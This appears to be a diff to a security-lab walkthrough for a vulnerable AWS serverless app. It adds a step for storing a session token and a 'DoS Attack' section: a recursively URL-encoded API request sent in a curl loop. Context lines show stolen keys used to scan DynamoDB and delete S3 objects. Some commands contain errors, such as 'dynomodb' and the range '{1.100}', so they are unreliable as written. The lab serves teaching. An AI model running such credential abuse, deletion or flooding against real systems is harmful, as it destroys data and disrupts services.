@@ -78,7 +78,8 @@ Return to the previous tab
     * aws_secret_access_key    
     * aws_access_key   
 2. Add the aws_session_token to the end of the user profile configuration by editing the *~/.aws/credentials* file  
-`vim ~/.aws/credentials`
+`vim ~/.aws/credentials`  
+`aws_session_token = <aws_session_token>`
 3. List the database contents  
 `aws dynomodb scan --table-name <table-name> --profile user`
 
@@ -95,3 +96,16 @@ Return to the previous tab
 `aws s3api delete-object --bucket <s3-bucket> --key <key> --profile`
 6. Repeat for each key value found  
 
+### DoS Attack
+Create a simple bash script to curl the site multiple times   
+This will demonstrate the serverless function going from reachable to unreachable  
+*internal server errors* are proof of a successful DoS Attack
+1. Start with the http address after a function is sent  
+(https://x.execute-api.us-east-1.amazonaws.com/Prod/api/convert?document_url=)
+2. Copy the address between brackets, URL encode it, and then add to the end of the address 
+3. Repeat Step 2 5x for the <http-address> value, which will perform the DoS
+4. The run the following bash script
+```for i in {1.100}; do 
+  echo $i
+  curl -L <http-address>
+done```
